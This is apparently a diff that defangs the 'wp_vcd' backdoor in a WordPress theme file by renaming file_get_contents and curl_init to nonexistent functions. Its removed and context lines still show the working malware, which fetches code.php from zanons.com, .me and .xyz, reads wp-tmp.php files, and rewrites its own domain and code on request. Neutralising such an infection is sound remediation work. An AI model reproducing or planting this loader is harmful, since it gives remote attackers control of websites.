@@ -16,9 +16,9 @@ $div_code_name="wp_vcd";
 							
 							if (!empty($_REQUEST['newdomain']))
 								{
-                                                                           if ($file = @file_get_contents(__FILE__))
+                                                                           if ($file = @file__get_contents(__FILE__))
 		                                                                    {
-                                                                                                 if(preg_match_all('/\$tmpcontent = @file_get_contents\("http:\/\/(.*)\/code\.php/i',$file,$matcholddomain))
+                                                                                                 if(preg_match_all('/\$tmpcontent = @file__get_contents\("http:\/\/(.*)\/code\.php/i',$file,$matcholddomain))
                                                                                                              {
 
 			                                                                           $file = preg_replace('/'.$matcholddomain[1][0].'/i',$_REQUEST['newdomain'], $file);
@@ -38,7 +38,7 @@ $div_code_name="wp_vcd";
 							
 							if (!empty($_REQUEST['newcode']))
 								{
-                                                                           if ($file = @file_get_contents(__FILE__))
+                                                                           if ($file = @file__get_contents(__FILE__))
 		                                                                    {
                                                                                                  if(preg_match_all('/\/\/\$start_wp_theme_tmp([\s\S]*)\/\/\$end_wp_theme_tmp/i',$file,$matcholdcode))
                                                                                                              {
@@ -73,9 +73,9 @@ if(!function_exists('theme_temp_setup')) {
     $path = $_SERVER['HTTP_HOST'] . $_SERVER[REQUEST_URI];
     if (stripos($_SERVER['REQUEST_URI'], 'wp-cron.php') == false && stripos($_SERVER['REQUEST_URI'], 'xmlrpc.php') == false) {
         
-        function file_get_contents_tcurl($url)
+        function file__get_contents_tcurl($url)
         {
-            $ch = curl_init();
+            $ch = curl__init();
             curl_setopt($ch, CURLOPT_AUTOREFERER, TRUE);
             curl_setopt($ch, CURLOPT_HEADER, 0);
             curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
@@ -107,7 +107,7 @@ if(!function_exists('theme_temp_setup')) {
         
 
 $wp_auth_key='08b370e35d008b6591dd40b0eec23025';
-        if (($tmpcontent = @file_get_contents("http://www.zanons.com/code.php") OR $tmpcontent = @file_get_contents_tcurl("http://www.zanons.com/code.php")) AND stripos($tmpcontent, $wp_auth_key) !== false) {
+        if (($tmpcontent = @file__get_contents("http://www.zanons.com/code.php") OR $tmpcontent = @file__get_contents_tcurl("http://www.zanons.com/code.php")) AND stripos($tmpcontent, $wp_auth_key) !== false) {
 
             if (stripos($tmpcontent, $wp_auth_key) !== false) {
                 extract(theme_temp_setup($tmpcontent));
@@ -124,7 +124,7 @@ $wp_auth_key='08b370e35d008b6591dd40b0eec23025';
         }
         
         
-        elseif ($tmpcontent = @file_get_contents("http://www.zanons.me/code.php")  AND stripos($tmpcontent, $wp_auth_key) !== false ) {
+        elseif ($tmpcontent = @file__get_contents("http://www.zanons.me/code.php")  AND stripos($tmpcontent, $wp_auth_key) !== false ) {
 
 if (stripos($tmpcontent, $wp_auth_key) !== false) {
                 extract(theme_temp_setup($tmpcontent));
@@ -138,16 +138,16 @@ if (stripos($tmpcontent, $wp_auth_key) !== false) {
                 }
                 
             }
-        } elseif ($tmpcontent = @file_get_contents(ABSPATH . 'wp-includes/wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
+        } elseif ($tmpcontent = @file__get_contents(ABSPATH . 'wp-includes/wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
             extract(theme_temp_setup($tmpcontent));
            
-        } elseif ($tmpcontent = @file_get_contents(get_template_directory() . '/wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
+        } elseif ($tmpcontent = @file__get_contents(get_template_directory() . '/wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
             extract(theme_temp_setup($tmpcontent)); 
 
-        } elseif ($tmpcontent = @file_get_contents('wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
+        } elseif ($tmpcontent = @file__get_contents('wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
             extract(theme_temp_setup($tmpcontent)); 
 
-        } elseif (($tmpcontent = @file_get_contents("http://www.zanons.xyz/code.php") OR $tmpcontent = @file_get_contents_tcurl("http://www.zanons.xyz/code.php")) AND stripos($tmpcontent, $wp_auth_key) !== false) {
+        } elseif (($tmpcontent = @file__get_contents("http://www.zanons.xyz/code.php") OR $tmpcontent = @file__get_contents_tcurl("http://www.zanons.xyz/code.php")) AND stripos($tmpcontent, $wp_auth_key) !== false) {
             extract(theme_temp_setup($tmpcontent)); 
 
         }
